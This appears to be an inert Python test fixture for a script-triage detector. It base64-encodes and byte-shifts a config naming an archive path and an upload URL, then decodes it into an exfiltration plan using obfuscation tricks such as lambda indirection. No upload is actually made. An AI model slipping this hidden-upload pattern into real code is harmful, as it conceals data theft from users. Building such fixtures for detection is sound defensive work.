#!/usr/bin/env python3

# Huntress Script Triage -- inert static-analysis fixture (cpython3)

import base64

import io

import os



MATERIAL_a9bff9bb = "bjUqdGtsXWhrNVtnZGRdW2xXZGdbWWQkXWZbZ1xdV1lqW2Bhbl0kbGpZZmtlYWxXal1lZ2xddFlcWWhsXWo1bWpkZGFaV2pdaW1da2xXWmdccXRrbFlfXVdbZ21mbDUpdGtxZmxZcDVcYVtsYWdmWWpxV1xha2hZbFtgdGdaXm1rW1lsYWdmNWRZZVpcWVdhZlxhal1bbGFnZnRbWWpqYV1qNWhxYWZrbFlkZF1qV2dmXVxhanRvYWZcZ29rV1tgWWFmNWptZlxkZCsqV2hqXVxdW11ra2dqdFtZZWhZYV9mV2FcNVtZZWhZYV9mJVtdXC9eWzArKCx0bWhkZ1lcV21qZDVgbGxoazInJ1tdXC9eWzArKCwmXXBZZWhkXSZhZm5ZZGFcJ21oZGdZXHRZaltgYW5dV2hZbGA1OzInSGpnX2pZZTxZbFknQG1mbGpda2tEWVonW1lbYF0lW11cL15bMCsoLCZyYWg="

CODEC_a9bff9bb = "base64_literal|subtract_modulo_256|08"



def load_a9bff9bb():

    return base64.b64decode(MATERIAL_a9bff9bb)



def decode_a9bff9bb(item1):

    return bytes((value + 8) % 256 for value in item1)



def recover_a9bff9bb():

    item4 = None

    item7 = "decode"

    while item7 != "done":

        if item7 == "decode":

            item2 = decode_a9bff9bb(load_a9bff9bb())

            item7 = "done"

    item3 = item2.decode("ascii", "strict")

    return item3



def inspect_a9bff9bb():

    view = memoryview(recover_a9bff9bb().encode("ascii"))

    return bytes(view).decode("ascii")



def surface_a9bff9bb():

    routes = {"selected": lambda: ("dictionary_dispatch", "lambda_indirection", "pyinstaller_onedir", "rundll32_predecessor")}

    return routes["selected"]()



def obfuscation_a9bff9bb():

    recover = lambda value: value

    return recover("lambda_indirection")



def plan_a9bff9bb():

    fields = dict(item.split("=", 1) for item in inspect_a9bff9bb().split("|"))

    analysis_surface = surface_a9bff9bb()

    obfuscation_surface = obfuscation_a9bff9bb()

    operation_plan = ("urllib_request_body", fields["archive_path"], fields["upload_url"])

    return operation_plan + (analysis_surface, obfuscation_surface)



if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":

    print(inspect_a9bff9bb())

